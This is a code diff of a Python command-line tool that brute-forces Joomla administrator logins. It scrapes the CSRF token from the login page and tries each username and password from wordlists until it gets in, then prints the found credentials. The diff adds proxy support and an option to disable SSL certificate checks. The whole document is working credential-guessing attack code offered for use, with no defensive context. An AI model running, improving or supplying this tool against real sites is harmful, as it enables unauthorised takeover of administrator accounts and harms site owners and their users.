@@ -6,7 +6,6 @@ import argparse
 from urllib.parse import urlparse
 import sys  # Import sys to use sys.stdout.flush()
 
-
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -24,43 +23,26 @@ class Joomla():
         self.sendrequest()
 
     def initializeVariables(self):
-        #Initialize args
-        parser = argparse.ArgumentParser(description='Joomla login bruteforce')
-        #required
-        parser.add_argument('-u', '--url', required=True, type=str, help='Joomla site')
+        parser = argparse.ArgumentParser(description='Joomla login bruteforce tool with proxy support and optional SSL verification disabling.')
+        parser.add_argument('-u', '--url', required=True, type=str, help='Joomla site URL')
         parser.add_argument('-w', '--wordlist', required=True, type=str, help='Path to wordlist file')
+        parser.add_argument('-p', '--proxy', type=str, help='Specify proxy (e.g., http://127.0.0.1:8080). Optional.')
+        parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output showing failed attempts.')
+        parser.add_argument('-k', '--insecure', action='store_true', help='Disable SSL certificate verification. Use with caution, especially with proxies.')
 
-        #optional
-        parser.add_argument('-p', '--proxy', type=str, help='Specify proxy. Optional. http://127.0.0.1:8080')
-        parser.add_argument('-v', '--verbose', action='store_true', help='Shows output.')
-        #these two arguments should not be together
         group = parser.add_mutually_exclusive_group(required=True)
-        group.add_argument('-usr', '--username', type=str, help='One single username')
-        group.add_argument('-U', '--userlist', type=str, help='Username list')
+        group.add_argument('-usr', '--username', type=str, help='Single username to attempt')
+        group.add_argument('-U', '--userlist', type=str, help='Path to file containing list of usernames')
 
         args = parser.parse_args()
 
-        #parse args and save proxy
+        self.proxies = None
         if args.proxy:
-            parsedproxyurl = urlparse(args.proxy)
-            self.proxy = { parsedproxyurl[0] : parsedproxyurl[1] }
-        else:
-            self.proxy=None
-
-        #determine if verbose or not
-        if args.verbose:
-            self.verbose=True
-        else:
-            self.verbose=False
-
-        #http:/site/administrator
-        self.url = args.url+'/administrator/'
-        self.ret = 'aW5kZXgucGhw'
-        self.option='com_login'
-        self.task='login'
-        #Need cookie
-        self.cookies = requests.session().get(self.url).cookies.get_dict()
-        #Wordlist from args
+            self.proxies = {'http': args.proxy, 'https': args.proxy}
+        self.verbose = args.verbose
+        self.verify_ssl = not args.insecure
+        self.url = args.url + '/administrator/'
+        self.cookies = requests.session().get(self.url, proxies=self.proxies, verify=self.verify_ssl).cookies.get_dict()
         self.wordlistfile = args.wordlist
         self.username = args.username
         self.userlist = args.userlist
@@ -68,27 +50,23 @@ class Joomla():
     def sendrequest(self):
         if self.userlist:
             for user in self.getdata(self.userlist):
-                self.username=user.decode('utf-8')
+                self.username = user.decode('utf-8')
                 self.doGET()
         else:
             self.doGET()
 
     def doGET(self):
-        passwords = self.getdata(self.wordlistfile)  # Load all passwords
-        total_passwords = len(passwords)  # Total number of passwords
-        current_password_index = 1  # Initialize password index
+        passwords = self.getdata(self.wordlistfile)
+        total_passwords = len(passwords)
+        current_password_index = 1
 
         for password in passwords:
-            # Dynamically update the progress message in one line, clearing the line first
-            progress_message = f'\rtrying password {current_password_index} of {total_passwords}: {password.decode("utf-8")}\033[K'
-            sys.stdout.write(progress_message)
-            sys.stdout.flush()  # Ensure the line is updated immediately
+            sys.stdout.write(f'\rTrying password {bcolors.OKGREEN}{current_password_index}{bcolors.ENDC} of {total_passwords}: {password.decode("utf-8")}{bcolors.ENDC}\033[K')
+            sys.stdout.flush()
 
-            # Custom user-agent
             headers = {'User-Agent': 'nano'}
+            r = requests.get(self.url, proxies=self.proxies, cookies=self.cookies, headers=headers, verify=self.verify_ssl)
 
-            # First GET for CSSRF
-            r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies, headers=headers)
             soup = BeautifulSoup(r.text, 'html.parser')
             longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
             password = password.decode('utf-8')
@@ -96,33 +74,28 @@ class Joomla():
             data = {
                 'username': self.username,
                 'passwd': password,
-                'option': self.option,
-                'task': self.task,
-                'return': self.ret,
+                'option': 'com_login',
+                'task': 'login',
+                'return': 'aW5kZXgucGhw',
                 longstring: 1
-               }
-    
-            r = requests.post(self.url, data=data, proxies=self.proxy, cookies=self.cookies, headers=headers)
+            }
+
+            r = requests.post(self.url, data=data, proxies=self.proxies, cookies=self.cookies, headers=headers, verify=self.verify_ssl)
             soup = BeautifulSoup(r.text, 'html.parser')
             response = soup.find('div', {'class': 'alert-message'})
 
             if response and self.verbose:
-                print(f'\n{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')  # Move to a new line for failed attempts
+                print(f'\n{bcolors.FAIL}Failed: {self.username}:{password}{bcolors.ENDC}')
             elif not response:
-                print(f'\n{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')  # Move to a new line for successful attempts
+                print(f'\n\nPassword Found: \n\nUsername:{bcolors.OKGREEN}{self.username}{bcolors.ENDC}\nPassword:{bcolors.OKGREEN}{password}{bcolors.ENDC}')
                 break
 
-            current_password_index += 1  # Increment the password index
-
-        # Ensure the cursor moves to a new line after the loop completes
-        print()
+            current_password_index += 1
 
     @staticmethod
     def getdata(path):
         with open(path, 'rb+') as f:
-            data = ([line.rstrip() for line in f])
-            f.close()
+            data = [line.rstrip() for line in f]
         return data
-
 
 joomla = Joomla()
